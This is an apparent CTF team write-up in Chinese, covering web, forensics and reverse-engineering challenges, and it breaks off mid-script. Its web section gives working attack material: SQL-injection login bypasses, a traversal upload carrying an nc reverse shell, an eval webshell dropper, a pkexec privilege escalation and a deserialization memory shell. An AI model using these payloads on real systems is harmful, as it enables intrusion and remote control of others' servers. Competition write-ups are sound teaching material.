</span></span></code></pre></td></tr></table></div></div><p>再使用https://github.com/Y4er/ysoserial 打内存马直接命令执行获取flag</p><p><img src=/img/2022-pcb-SU-Writeup/image5.png alt></p><p><img src=/img/2022-pcb-SU-Writeup/image6.png alt></p><p>PCL{870bf708ae428c5da3191e69b4badf6a}</p><h3 id=can_u_login>can_u_login</h3><p>这里是一quine注入，要求输入和输出一样才行</p><p>参考2021的第五空间https://www.cnblogs.com/kingbridge/articles/15818673.html</p><p>这里构造payload&rsquo;/<strong>/union/</strong>/select(REPLACE(REPLACE(&rsquo;"/<strong>/union/</strong>/select(REPLACE(REPLACE("!",CHAR(34),CHAR(39)),CHAR(33),"!"))%23&rsquo;,CHAR(34),CHAR(39)),CHAR(33),&rsquo;"/<strong>/union/</strong>/select(REPLACE(REPLACE("!",CHAR(34),CHAR(39)),CHAR(33),"!"))%23&rsquo;))%23</p><p>入让输入和输出一样</p><p><img src=/img/2022-pcb-SU-Writeup/image7.png alt></p><p>绕过验证获取flag PCL{7a7a24ec-9dc5-434e-b30c-92fe2df7d626}</p><h3 id=高手高手高高手>高手高手高高手</h3><p>dirsearch 扫描发现 .git 利用 githacker 下载源码</p><p>切到第一版本 发现是 navigate CMS 2.8 版本 具有多种漏洞.</p><p>可以 RCE</p><p>bypass 登陆</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /login.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 192.168.1.116
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
</span></span><span class=line><span class=cl>Cookie: navigate-user=\&#39; or TRUE # ;
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><p>授权 RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>POST</span> <span class=o>/</span><span class=n>navigate_upload</span><span class=o>.</span><span class=n>php</span><span class=err>?</span><span class=n>session_id</span><span class=o>=</span><span class=mi>5</span><span class=n>b62jp0rgrcqc8e337c0pnv7o4</span><span class=o>&amp;</span><span class=n>engine</span><span class=o>=</span><span class=n>picnik</span><span class=o>&amp;</span><span class=n>id</span><span class=o>=....//....//....//</span><span class=n>navigate_info</span><span class=o>.</span><span class=n>php</span> <span class=n>HTTP</span><span class=o>/</span><span class=mf>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=p>:</span> <span class=mf>192.168</span><span class=o>.</span><span class=mf>1.116</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=p>:</span> <span class=n>no</span><span class=o>-</span><span class=n>cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache</span><span class=o>-</span><span class=ne>Control</span><span class=p>:</span> <span class=n>no</span><span class=o>-</span><span class=n>cache</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade</span><span class=o>-</span><span class=n>Insecure</span><span class=o>-</span><span class=n>Requests</span><span class=p>:</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>User</span><span class=o>-</span><span class=n>Agent</span><span class=p>:</span> <span class=n>Mozilla</span><span class=o>/</span><span class=mf>5.0</span> <span class=p>(</span><span class=n>Macintosh</span><span class=p>;</span> <span class=n>Intel</span> <span class=n>Mac</span> <span class=ne>OS</span> <span class=n>X</span> <span class=mi>10</span><span class=n>_15_7</span><span class=p>)</span> <span class=n>AppleWebKit</span><span class=o>/</span><span class=mf>537.36</span> <span class=p>(</span><span class=n>KHTML</span><span class=p>,</span> <span class=n>like</span> <span class=n>Gecko</span><span class=p>)</span> <span class=n>Chrome</span><span class=o>/</span><span class=mf>103.0</span><span class=o>.</span><span class=mf>0.0</span> <span class=n>Safari</span><span class=o>/</span><span class=mf>537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=p>:</span> <span class=n>text</span><span class=o>/</span><span class=n>html</span><span class=p>,</span><span class=n>application</span><span class=o>/</span><span class=n>xhtml</span><span class=o>+</span><span class=n>xml</span><span class=p>,</span><span class=n>application</span><span class=o>/</span><span class=n>xml</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.9</span><span class=p>,</span><span class=n>image</span><span class=o>/</span><span class=n>avif</span><span class=p>,</span><span class=n>image</span><span class=o>/</span><span class=n>webp</span><span class=p>,</span><span class=n>image</span><span class=o>/</span><span class=n>apng</span><span class=p>,</span><span class=o>*/*</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.8</span><span class=p>,</span><span class=n>application</span><span class=o>/</span><span class=n>signed</span><span class=o>-</span><span class=n>exchange</span><span class=p>;</span><span class=n>v</span><span class=o>=</span><span class=n>b3</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.9</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>-</span><span class=n>Encoding</span><span class=p>:</span> <span class=n>gzip</span><span class=p>,</span> <span class=n>deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>-</span><span class=n>Language</span><span class=p>:</span> <span class=n>zh</span><span class=o>-</span><span class=n>CN</span><span class=p>,</span><span class=n>zh</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.9</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=p>:</span> <span class=n>navigate</span><span class=o>-</span><span class=n>tinymce</span><span class=o>-</span><span class=n>scroll</span><span class=o>=%</span><span class=mi>7</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span><span class=p>;</span> <span class=n>navigate</span><span class=o>-</span><span class=n>language</span><span class=o>=</span><span class=n>en</span><span class=p>;</span> <span class=n>NVSID_7da51544</span><span class=o>=</span><span class=mi>5</span><span class=n>b62jp0rgrcqc8e337c0pnv7o4</span><span class=p>;</span> 
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=p>:</span> <span class=n>close</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Type</span><span class=p>:</span> <span class=n>multipart</span><span class=o>/</span><span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=p>;</span> <span class=n>boundary</span><span class=o>=--------------------------</span><span class=mi>114514</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Length</span><span class=p>:</span> <span class=mi>352</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>----------------------------</span><span class=mi>114514</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Disposition</span><span class=p>:</span> <span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=p>;</span> <span class=n>name</span><span class=o>=</span><span class=s2>&#34;file&#34;</span><span class=p>;</span> <span class=n>filename</span><span class=o>=</span><span class=s2>&#34;a.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Type</span><span class=p>:</span> <span class=n>application</span><span class=o>/</span><span class=n>x</span><span class=o>-</span><span class=n>httpd</span><span class=o>-</span><span class=n>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>var_dump</span><span class=p>(</span><span class=o>$</span><span class=n>_POST</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>(</span><span class=s2>&#34;ls -al&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=c1># system(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.28.0.4 4443 &gt;/tmp/f&#34;);</span>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>----------------------------</span><span class=mi>114514</span><span class=o>--</span>
</span></span></code></pre></td></tr></table></div></div><p>用 注释中的内容 RCE 反弹 Shell 触发 RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /navigate_info.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 192.168.1.116
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
</span></span><span class=line><span class=cl>Cookie: NVSID_7da51544=5b62jp0rgrcqc8e337c0pnv7o4; 
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Length: 4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cmd=ls
</span></span></code></pre></td></tr></table></div></div><p>然后 拿到 反弹回来的 Shell</p><p>写入 Linpeas 检查提权情况</p><p>发现 pkexec 提权 CVE-2021-4034</p><p>然后下载纯 C 代码 版本进行提权</p><p>发现 假 flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat flag
</span></span><span class=line><span class=cl>a48,a35,a44,a91,a19,a65,a21,a69,a69,a67,a13,a18,a20,a65,a21,a13,a19,a23,a65,a69,a13,a20,a67,a17,a18,a13,a25,a17,a65,a69,a17,a68,a19,a19,a68,a18,a65,a17,a93
</span></span></code></pre></td></tr></table></div></div><p>发现 I_want_capture_the_flag 文件为 ELF</p><p>逆向后 发现需要去掉 bocai 文件 然后进行删除</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>lsattr</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>cache</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>cfg</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>crossdomain</span><span class=o>.</span><span class=n>xml</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>css</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>favicon</span><span class=o>.</span><span class=n>ico</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>images</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>img</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>index</span><span class=o>.</span><span class=n>html</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>index</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>js</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>lib</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>LICENSE</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>login</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>navigate_download</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>navigate_info</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>navigate</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>navigate</span><span class=o>.</span><span class=n>sql</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>navigate_upload</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>package</span><span class=o>.</span><span class=n>zip</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>plugins</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>private</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>README</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>themes</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>updates</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>web</span>
</span></span><span class=line><span class=cl><span class=o>----</span><span class=n>ia</span><span class=o>----------</span> <span class=o>./</span><span class=n>bocai</span><span class=o>.</span><span class=n>html</span>
</span></span><span class=line><span class=cl><span class=o>----</span><span class=n>ia</span><span class=o>----------</span> <span class=o>./</span><span class=n>bocai</span><span class=o>.</span><span class=n>png</span>
</span></span><span class=line><span class=cl><span class=o>----------------</span> <span class=o>./</span><span class=n>I_want_capture_the_flag</span>
</span></span><span class=line><span class=cl><span class=n>chattr</span> <span class=o>-</span><span class=n>ia</span> <span class=n>bocai</span><span class=o>.*</span>
</span></span><span class=line><span class=cl><span class=n>rm</span> <span class=o>-</span><span class=n>rf</span> <span class=n>bocai</span><span class=o>.*</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>
</span></span><span class=line><span class=cl><span class=n>I_want_capture_the_flag</span>
</span></span><span class=line><span class=cl><span class=n>LICENSE</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>README</span>
</span></span><span class=line><span class=cl><span class=n>cache</span>
</span></span><span class=line><span class=cl><span class=n>cfg</span>
</span></span><span class=line><span class=cl><span class=n>crossdomain</span><span class=o>.</span><span class=n>xml</span>
</span></span><span class=line><span class=cl><span class=n>css</span>
</span></span><span class=line><span class=cl><span class=n>favicon</span><span class=o>.</span><span class=n>ico</span>
</span></span><span class=line><span class=cl><span class=n>images</span>
</span></span><span class=line><span class=cl><span class=n>img</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=o>.</span><span class=n>html</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>js</span>
</span></span><span class=line><span class=cl><span class=n>lib</span>
</span></span><span class=line><span class=cl><span class=n>login</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>navigate</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>navigate</span><span class=o>.</span><span class=n>sql</span>
</span></span><span class=line><span class=cl><span class=n>navigate_download</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>navigate_info</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>navigate_upload</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>package</span><span class=o>.</span><span class=n>zip</span>
</span></span><span class=line><span class=cl><span class=n>plugins</span>
</span></span><span class=line><span class=cl><span class=n>private</span>
</span></span><span class=line><span class=cl><span class=n>themes</span>
</span></span><span class=line><span class=cl><span class=n>updates</span>
</span></span><span class=line><span class=cl><span class=n>web</span>
</span></span><span class=line><span class=cl><span class=o>./</span><span class=n>I_want_capture_the_flag</span>
</span></span><span class=line><span class=cl><span class=n>PCL</span><span class=p>{</span><span class=mi>3</span><span class=n>a5eecXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=easygo>easygo</h3><p>下载附件 根据 gomod 检查到 github 仓库</p><p><a href=https://github.com/KaanSK/golang-sqli-challenge>https://github.com/KaanSK/golang-sqli-challenge</a></p><p>然后访问 发现 solution</p><p>PostgreSQL 注入 在 juice 下</p><p>通过 solution 或者sqlmap 就可以获取到flag 在 select flag from super_secret_table 下</p><h3 id=easysql>easysql</h3><p>dirsearch 扫描发现phpmyadmin，口令root，password到了后台</p><p><img src=/img/2022-pcb-SU-Writeup/image8.png alt></p><p>挨个登陆 发现其中一个有flag User=SuperF1@g&amp;Pass=F1@g_1N_Th1S_UsEr_Y0u_Ge7_P@ssW0rd!!!</p><p><img src=/img/2022-pcb-SU-Writeup/image9.png alt></p><h3 id=压缩包>压缩包</h3><p>解法1：</p><p>制作一个多文件的压缩包如下图：</p><p><img src=/img/2022-pcb-SU-Writeup/image10.png alt></p><p>将压缩包base64编码后通过content参数发包</p><p>通过条件竞争去访问xxada.php</p><p><a href=http://192.168.1.113/static/upload/b712fd7be07efcb74ee5a9a9e5eb6ceb/xxxada.php>http://192.168.1.113</a>:8521/static/upload/1b4fd24ada6be9d55e67a6f8ab55c0c9/xxada.php</p><p><img src=/img/2022-pcb-SU-Writeup/image11.png alt></p><p>通过puts跨目录写shell到static/upload/下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php fputs(fopen(&#39;../shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#34;cmd&#34;])?&#39;);?&gt;
</span></span></code></pre></td></tr></table></div></div><p>http://192.168.1.110:8521/static/upload/shell.php</p><p><img src=/img/2022-pcb-SU-Writeup/image12.png alt></p><p>解法2：</p><p>构造一个畸形的压缩包或者解压到一半损坏的压缩包即可。</p><p><img src=/img/2022-pcb-SU-Writeup/image13.png alt></p><p><img src=/img/2022-pcb-SU-Writeup/image14.png alt></p><p><img src=/img/2022-pcb-SU-Writeup/image15.png alt></p><h2 id=misc>misc</h2><h3 id=简单取证>简单取证</h3><p>filescan发现secret.jpg</p><p><img src=/img/2022-pcb-SU-Writeup/image16.png alt></p><p>下载之后打开发现是base64编码,解码之后发现是倒置的zip</p><p>简单处理下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a=open(&#39;1.zip&#39;,&#39;rb&#39;)
</span></span><span class=line><span class=cl>b=a.read()[::-1]
</span></span><span class=line><span class=cl>c=open(&#39;2.zip&#39;,&#39;wb&#39;)
</span></span><span class=line><span class=cl>c.write(b)
</span></span></code></pre></td></tr></table></div></div><p>发现要密码,最后在cmdscan里面发现密码</p><p><img src=/img/2022-pcb-SU-Writeup/image17.png alt></p><p>得到flag.txt,发现是每行是一个点的坐标</p><p>使用gnuplot画图</p><p><img src=/img/2022-pcb-SU-Writeup/image18.png alt></p><p>扫码得到flag</p><h3 id=misc_water>Misc_water</h3><p>发现给出的png文件结尾还有多余数据,很容易发现是一个jpg数据的倒置与一个png文件</p><p><img src=/img/2022-pcb-SU-Writeup/image19.png alt></p><p>简单的提取处理一下,得到三张图片</p><p><img src=/img/2022-pcb-SU-Writeup/image20.png alt></p><p>根据题目名称water,猜测是盲水印</p><p><img src=/img/2022-pcb-SU-Writeup/image21.png alt></p><p>得到压缩包密码:ZC4#QaWbW</p><p>得到一张奇怪的图片,010打开发现crc报错,而且根据图片内容很容易发现是高宽被修改</p><p><img src=/img/2022-pcb-SU-Writeup/image22.png alt></p><p>因此开始爆破png宽高,得到flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import zlib
</span></span><span class=line><span class=cl>import struct
</span></span><span class=line><span class=cl># 同时爆破宽度和高度
</span></span><span class=line><span class=cl>filename = &#34;1.png&#34;
</span></span><span class=line><span class=cl>with open(filename, &#39;rb&#39;) as f:
</span></span><span class=line><span class=cl>    all_b = f.read()
</span></span><span class=line><span class=cl>    data = bytearray(all_b[12:29])
</span></span><span class=line><span class=cl>    n = 4095
</span></span><span class=line><span class=cl>    for w in range(n):
</span></span><span class=line><span class=cl>        width = bytearray(struct.pack(&#39;&gt;i&#39;, w))
</span></span><span class=line><span class=cl>        for h in range(n):
</span></span><span class=line><span class=cl>            height = bytearray(struct.pack(&#39;&gt;i&#39;, h))
</span></span><span class=line><span class=cl>            for x in range(4):
</span></span><span class=line><span class=cl>                data[x+4] = width[x]
</span></span><span class=line><span class=cl>                data[x+8] = height[x]
</span></span><span class=line><span class=cl>            crc32result = zlib.crc32(data)
</span></span><span class=line><span class=cl>            #替换成图片的crc
</span></span><span class=line><span class=cl>            if crc32result == 0xe5c6e010:
</span></span><span class=line><span class=cl>                print(&#34;宽为：&#34;, end = &#39;&#39;)
</span></span><span class=line><span class=cl>                print(width, end = &#39; &#39;)
</span></span><span class=line><span class=cl>                print(int.from_bytes(width, byteorder=&#39;big&#39;))
</span></span><span class=line><span class=cl>                print(&#34;高为：&#34;, end = &#39;&#39;)
</span></span><span class=line><span class=cl>                print(height, end = &#39; &#39;)
</span></span><span class=line><span class=cl>                print(int.from_bytes(height, byteorder=&#39;big&#39;))
</span></span><span class=line><span class=cl>                break 
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2022-pcb-SU-Writeup/image23.png alt></p><p>修改高宽后得到flag</p><p><img src=/img/2022-pcb-SU-Writeup/image24.png alt></p><h3 id=what_is_log>what_is_log</h3><p>文件是scap后缀，搜了一下可以用sysdig去分析</p><p>看题目描述：某机器的mysql中存在一些秘密，通过log文件你能找到它输入的密码或者这个秘密吗(添加PCL格式提交)</p><p>所以得找mysql查询这个秘密的记录</p><p>这里用sysdir把记录导出成txt分析</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sysdig -r flag2.scap &gt; 1.txt
</span></span></code></pre></td></tr></table></div></div><p>在vscode里面翻了一下，大概翻到了个查询表的结构</p><p><img src=/img/2022-pcb-SU-Writeup/image25.png alt></p><p>搜索这种表的特征，找到了一串数据，且带有seccess，符合题目语境</p><p><img src=/img/2022-pcb-SU-Writeup/image26.png alt></p><p>PCL{1555a651a13ec074ce725383214fd7cc}</p><h3 id=babybit>babybit</h3><p>首先用OSFMount挂载镜像，然后用DiskGenius打开G盘：</p><p><img src=/img/2022-pcb-SU-Writeup/image27.png alt></p><p>把zip文件导出来，其实里边就是注册表的备份文件:</p><p><img src=/img/2022-pcb-SU-Writeup/image28.png alt></p><p>用Register Explorer导入注册表备份文件，bitlocker的加密开始时间位于SYSTEM:ControlSet001\Control\FVEStats\OscEncryptInit，加密结束时间则位于SYSTEM:ControlSet001\Control\FVEStats\OscEncryptComplete。</p><p>这里应该说是时间戳，把时间戳转为正常的date格式：</p><p><img src=/img/2022-pcb-SU-Writeup/image29.png alt></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import datetime
</span></span><span class=line><span class=cl>timestamp = 132995782594427750 #132995786261823536
</span></span><span class=line><span class=cl>value = datetime.datetime (1601, 1, 1) + datetime.timedelta(seconds=timestamp/10000000) ### combine str 3 and 4
</span></span><span class=line><span class=cl>print(value.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;))
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># 2022-06-13 07:17:39
</span></span><span class=line><span class=cl># 2022-06-13 07:23:46
</span></span></code></pre></td></tr></table></div></div><p>最后还需要把date的小时加8，因为注册表中时间戳为UTC+0，需要转成UTC+8，最后的flag：PCL{2022/6/13_15:17:39_2022/6/13_15:23:46}</p><h2 id=re>re</h2><h3 id=baby_re>baby_re</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>key = [0x00000056, 0x00000057, 0x00000058, 0x00000059]
</span></span><span class=line><span class=cl>key[0] ^= 0x47
</span></span><span class=line><span class=cl>key[1] ^= 0x32
</span></span><span class=line><span class=cl>key[2] ^= 0x11
</span></span><span class=line><span class=cl>key[3] ^= 0x12
</span></span><span class=line><span class=cl>enc = [119, 9, 40, 44, 106, 83, 126, 123, 33, 87, 113, 123, 112, 93, 125, 127, 41, 82, 44, 127, 39, 3, 126, 125, 119, 87, 47, 125, 33, 6, 44, 127, 112, 0, 126, 123, 115, 24]
</span></span><span class=line><span class=cl>flag = bytearray(enc)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>for i in range(len(enc)):
